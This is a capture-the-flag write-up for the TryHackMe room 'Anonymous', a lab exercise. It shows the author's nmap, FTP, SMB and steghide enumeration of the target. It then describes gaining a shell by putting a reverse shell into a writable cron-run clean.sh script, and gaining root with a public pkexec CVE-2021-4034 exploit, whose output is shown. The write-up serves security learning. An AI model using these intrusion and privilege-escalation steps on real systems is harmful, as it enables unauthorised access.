---
title: "Anonymous"
date: 2025-03-26
image: /assets/img/tryhackme/Anonymous/Anonymous_image.jpg
description: Writeup of the TryHackMe-CTF Anonymous
categories: [TryHackMe, Medium]
tags: [linux, ftp, smb, pkexec]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Anonymous</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Not the hacking group</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Medium</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/anonymous">https://tryhackme.com/room/anonymous</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge ###.  

## Enumeration
I started the enumeration using `nmap`:
```bash
kali@kali:~/ctf/anonymous$ nmap -p- 10.10.186.161              
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-26 10:15 EDT
  Nmap scan report for 10.10.186.161
  Host is up (0.043s latency).
  Not shown: 65531 closed tcp ports (conn-refused)
  PORT    STATE SERVICE
  21/tcp  open  ftp
  22/tcp  open  ssh
  139/tcp open  netbios-ssn
  445/tcp open  microsoft-ds

  Nmap done: 1 IP address (1 host up) scanned in 24.46 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
kali@kali:~/ctf/anonymous$ nmap -A -p 21,22,139,445 10.10.186.161
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-26 10:16 EDT
  Nmap scan report for 10.10.186.161
  Host is up (0.043s latency).

  PORT    STATE SERVICE     VERSION
  21/tcp  open  ftp         vsftpd 2.0.8 or later
  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  |_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
  | ftp-syst: 
  |   STAT: 
  | FTP server status:
  |      Connected to ::ffff:10.21.63.26
  |      Logged in as ftp
  |      TYPE: ASCII
  |      No session bandwidth limit
  |      Session timeout in seconds is 300
  |      Control connection is plain text
  |      Data connections will be plain text
  |      At session startup, client count was 2
  |      vsFTPd 3.0.3 - secure, fast, stable
  |_End of status
  22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
  |   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
  |_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
  139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
  Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Host script results:
  | smb2-time: 
  |   date: 2025-03-26T14:16:56
  |_  start_date: N/A
  | smb-security-mode: 
  |   account_used: guest
  |   authentication_level: user
  |   challenge_response: supported
  |_  message_signing: disabled (dangerous, but default)
  | smb-os-discovery: 
  |   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
  |   Computer name: anonymous
  |   NetBIOS computer name: ANONYMOUS\x00
  |   Domain name: \x00
  |   FQDN: anonymous
  |_  System time: 2025-03-26T14:16:57+00:00
  |_clock-skew: mean: -6s, deviation: 1s, median: -6s
  | smb2-security-mode: 
  |   3:1:1: 
  |_    Message signing enabled but not required
  |_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 13.48 seconds
```
From here I proceeded the analysis port by port.

## Port 21 Analysis

Since Nmap discovered that the anonymous login was possible, I attempted to connect to the FTP server and was successful: 
```bash
kali@kali:~/ctf/anonymous$ ftp anonymous@10.10.186.161
  220 NamelessOne's FTP Server!
  Password: 
  230 Login successful.
  ftp> ls -al
  drwxr-xr-x    3 65534    65534        4096 May 13  2020 .
  drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
  drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
  ftp> cd scripts
  ftp> ls -al
  drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
  drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
  -rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
  -rw-rw-r--    1 1000     1000          989 Mar 26 14:18 removed_files.log
  -rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```

I found three files, which I downloaded and analyzed:
```bash
kali@kali:~/ctf/anonymous$ cat to_do.txt        
I really need to disable the anonymous login...it's really not safe

kali@kali:~/ctf/anonymous$ cat clean.sh 
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi

kali@kali:~/ctf/anonymous$ cat removed_files.log 
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
```

The files didn't provided any further information, so I continued with the next port.

## Port 139 & 445 Analysis

I proceeded by enumerating the system for potential accessible SMB shares using `enum4linux` and received the following output:
```bash
kali@kali:~/ctf/anonymous$ enum4linux 10.10.186.161
  [...]
  Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
  [...]
  //10.10.186.161/pics    Mapping: OK Listing: OK Writing: N/A
```

The share `pics` appeared to be accessible, and I was able to connect successfully to the share using `smbclient`:
```bash
kali@kali:~/ctf/anonymous$ smbclient  -N \\\\10.10.186.161\\pics    
  Try "help" to get a list of possible commands.
  smb: \> ls
    .                                   D        0  Sun May 17 07:11:34 2020
    ..                                  D        0  Wed May 13 21:59:10 2020
    corgo2.jpg                          N    42663  Mon May 11 20:43:42 2020
    puppos.jpeg                         N   265188  Mon May 11 20:43:42 2020
```

I downloaded the files and analyzed them using steganography techniques but wasn't able to extract anything useful:
```bash
kali@kali:~/ctf/anonymous$ steghide --extract -sf corgo2.jpg            
Enter passphrase: 
steghide: could not extract any data with that passphrase!
                                                                                                                                            
kali@kali:~/ctf/anonymous$ steghide --extract -sf puppos.jpeg 
Enter passphrase: 
steghide: could not extract any data with that passphrase!

```
## Shell as namelessone

Since none of the files gave me any clues to gain initial access, I tried modifying files on the FTP server using FileZilla. I started a Netcat listener and inserted a reverse shell payload into the `clean.sh` script. After I pressed save I got the following response:  
```text
File transfer successful, transferred 403 bytes in 1 second
```

While reading this message, my Netcat listener received the reverse shell, and I was able to retrieve the user flag:
```bash
namelessone@anonymous:~$ id
  uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
namelessone@anonymous:~$ cat user.txt
  9[removed]0
```

## Privilege Escalation root
Next, I checked for SUID bits and discoverd that `pkexec` had its SUID bit set. I used the exploit described in <a href="https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py">CVE-2021-4034</a> and successfully gained root access:
```bash
namelessone@anonymous:~$ find / -perm /4000 -type f 2>/dev/null
  [...]
  /usr/bin/pkexec
  [...]
namelessone@anonymous:~$ nano exploit.py
namelessone@anonymous:~$ python3 exploit.py 
  Do you want to choose a custom payload? y/n (n use default payload)  n
  [+] Cleaning pervious exploiting attempt (if exist)
  [+] Creating shared library for exploit code.
  [+] Finding a libc library to call execve
  [+] Found a library at <CDLL 'libc.so.6', handle 7f93d502d000 at 0x7f93d3ad87f0>
  [+] Call execve() with chosen payload
  [+] Enjoy your root shell
# id
  uid=0(root) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
# cat /root/root.txt
  4[removed]3
```

solved! :)